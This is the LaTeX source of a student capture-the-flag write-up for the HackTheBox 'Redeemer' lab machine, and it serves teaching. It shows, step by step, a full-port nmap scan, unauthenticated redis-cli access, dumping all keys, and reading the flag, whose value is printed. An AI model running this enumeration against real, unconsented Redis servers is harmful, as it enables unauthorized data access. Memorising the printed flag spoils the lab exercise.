\documentclass[conference]{IEEEtran}
\IEEEoverridecommandlockouts
% The preceding line is only needed to identify funding in the first footnote. If that is unneeded, please comment it out.
\usepackage{cite}
\usepackage{amsmath,amssymb,amsfonts}
\usepackage{graphicx}
\usepackage{textcomp}
\usepackage{xcolor}
\usepackage[hyphens]{url}
\usepackage{hyperref}
\usepackage{listings}
\def\BibTeX{{\rm B\kern-.05em{\sc i\kern-.025em b}\kern-.08em
    T\kern-.1667em\lower.7ex\hbox{E}\kern-.125emX}}

\newcommand{\rom}[1]{\uppercase\expandafter{\romannumeral #1\relax}}

\begin{document}

\title{HackTheBox: Redeemer Machine}

\author{\IEEEauthorblockN{Lennart Buhl}
\IEEEauthorblockA{\textit{Department of Computer Science} \\
\textit{University of St. Thomas}\\
\textit{September, 2023}}}

\maketitle



\begin{abstract}
Today, we try to pawn the machine with the moniker Redeemer.
\end{abstract}



\begin{IEEEkeywords}
programming, cybersecurity, security, pentesting
\end{IEEEkeywords}


\section{Introduction}
Redeemer is located at IPv4 10.129.223.3. Which we can access through the HackTheBox OpenVPN gateway.
We achieve this by simply running this command in a shell:
\begin{scriptsize}
\begin{verbatim}
sudo openvpn starting_point_{user}.ovpn
\end{verbatim}
\end{scriptsize}

\\
\textit{I will now switch to root shell.}
\\

Once we are on the VPN, we can check if we have access to the machine at 10.129.223.3:
\begin{scriptsize}
\begin{verbatim}
root@ghost:~# ping 10.129.223.3
PING 10.129.223.3 (10.129.223.3) 56(84) bytes of data.
64 bytes from 10.129.223.3: icmp_seq=1 ttl=63 time=34.8 ms
64 bytes from 10.129.223.3: icmp_seq=2 ttl=63 time=34.5 ms
64 bytes from 10.129.223.3: icmp_seq=3 ttl=63 time=34.5 ms
64 bytes from 10.129.223.3: icmp_seq=4 ttl=63 time=34.5 ms
^C
--- 10.129.223.3 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 34.464/34.553/34.769/0.125 ms

\end{verbatim}
\end{scriptsize}

We wait for four consecutive packets that have been successfully transmitted to hit CTRL+C.
\\
Now we scan all the ports using nmap:
\begin{scriptsize}
\begin{verbatim}
root@ghost:~# nmap -p- 10.129.223.3
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 13:51 CDT
Nmap scan report for 10.129.223.3
Host is up (0.043s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE
6379/tcp open  redis

Nmap done: 1 IP address (1 host up) scanned in 24.97 seconds
\end{verbatim}
\end{scriptsize}

When using nmap, we can specify nmap to scan ALL ports using "-p-" this will ensure we do not miss a port. As by default, nmap only scans the top 1000 ports.

\begin{verbatim}
PORT     STATE SERVICE
6379/tcp open  redis
\end{verbatim}

Okay, now that we have found port 6379, and see that redis is being run a service on that port, we can do some googling to see what we can find.

After some googling, we find that redis is a type of NoSQl database, which can be accessed via the command-line using "redis-cli".

\begin{scriptsize}
\begin{verbatim}
root@ghost:~# redis-cli -h 10.129.223.3 -p 6379
10.129.223.3:6379>
\end{verbatim}
\end{scriptsize}

We can access the database using the "-h" argument (which is looking for a host / IP Address) and the "-p" argument (which is specifying the Port of the host).

We are then offered a shell, where we can execute commands. After some more googling, we find that redis is a in-memory key-value database. Which essentially means, if we find the keys, we can access the associated values. Using the following command, we are given ALL keys in that database.

\begin{scriptsize}
\begin{verbatim}
10.129.223.3:6379> KEYS *
1) "flag"
2) "numb"
3) "temp"
4) "stor"
\end{verbatim}
\end{scriptsize}

Notice, how we used the "*" wildcard to get every key.

Now, since we are in a "Capture The Flag" (CTF) style game, we can assume the flag is the value associated with the key "flag". We want to get the value for key "flag".

\begin{scriptsize}
\begin{verbatim}
10.129.223.3:6379> GET flag
"03e1d2b376c37ab3f5319922053953eb"
\end{verbatim}
\end{scriptsize}

Boom. We got the flag.

\end{document}